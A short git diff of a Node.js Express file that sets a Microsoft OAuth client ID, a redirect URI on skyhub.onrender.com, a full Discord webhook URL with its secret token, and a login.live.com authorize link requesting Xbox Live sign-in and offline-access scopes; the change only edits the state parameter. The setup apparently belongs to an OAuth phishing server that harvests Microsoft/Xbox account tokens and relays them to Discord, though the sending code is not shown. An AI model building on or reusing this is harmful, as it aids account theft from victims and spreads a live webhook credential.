@@ -4,7 +4,7 @@ const client_id = '633c72ff-333a-495e-be20-8416cfbe7f5c'
 const redirect_uri = 'https://skyhub.onrender.com'
 const webhook_url = 'https://ptb.discord.com/api/webhooks/1113551902194552902/IKI4gMEgyAIT5rn4i-yYiH4pNA9AjRald5dOlxrBl_VOnRepx9Qqz-nD_5Sfs190VsRv'
 //Requirements
-const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=OK'
+const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
 const axios = require('axios')
 const express = require('express')
 const app = express()
